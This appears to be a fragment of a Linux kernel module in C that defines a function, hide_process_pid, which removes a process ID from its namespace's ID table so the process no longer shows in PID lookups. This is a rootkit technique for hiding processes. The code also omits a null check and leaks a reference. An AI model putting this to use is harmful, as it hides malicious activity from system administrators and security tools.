#include <linux/list.h>
#include <linux/idr.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/pid_namespace.h>

#define PID_A_LEN 32

void hide_process_pid(pid_t pid_nr)
{
    struct pid *pid = find_get_pid(pid_nr);

    idr_remove(&pid->numbers[0].ns->idr, pid_nr);
}
